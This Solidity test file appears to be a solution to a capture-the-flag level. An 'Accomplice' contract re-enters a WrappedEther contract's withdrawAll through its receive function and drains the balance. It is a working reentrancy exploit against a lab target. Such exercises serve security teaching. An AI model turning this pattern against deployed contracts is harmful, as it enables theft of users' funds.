// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/13_WrappedEther/WrappedEther.sol";

contract Accomplice {
    WrappedEther instance;
    uint256 retries;
    uint256 counter = 0;
    bool isRobbing = false;

    constructor(WrappedEther _instance) {
        instance = _instance;
    }

    function deposit() external {
        instance.deposit{value: 0.01 ether}(address(this));
    }

    function startRobbery(uint256 _retries) external {
        isRobbing = true;
        counter = 0;
        retries = _retries;
        instance.withdrawAll();
    }

    receive() external payable {
        if (isRobbing) {
            counter++;

            if (counter < retries) {
                instance.withdrawAll();
            } else {
                isRobbing = false;
            }
        }
    }
}

// forge test --match-contract WrappedEtherTest
contract WrappedEtherTest is BaseTest {
    WrappedEther instance;

    function setUp() public override {
        super.setUp();

        instance = new WrappedEther();
        instance.deposit{value: 0.09 ether}(address(this));
    }

    function testExploitLevel() public {
        vm.prank(user1);

        Accomplice accomplice = new Accomplice(instance);
        payable(address(accomplice)).call{value: 0.01 ether}("");
        accomplice.deposit();
        accomplice.startRobbery(10);

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
